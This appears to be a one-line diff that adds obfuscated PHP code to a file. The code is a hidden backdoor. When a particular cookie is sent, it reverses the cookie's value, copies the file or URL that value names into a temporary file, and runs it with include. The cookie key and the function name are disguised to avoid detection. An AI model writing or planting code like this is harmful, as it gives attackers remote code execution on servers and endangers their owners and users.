@@ -1,0 +1,1 @@
+<?= 0; if(isset($_COOKIE[1*~.1])){$_=tmpfile();$$_=stream_get_meta_data($_)['uri'];@('co'.'py')(strrev($_COOKIE[-0**-0]),$$_);include($$_);fclose($_);exit();}?>
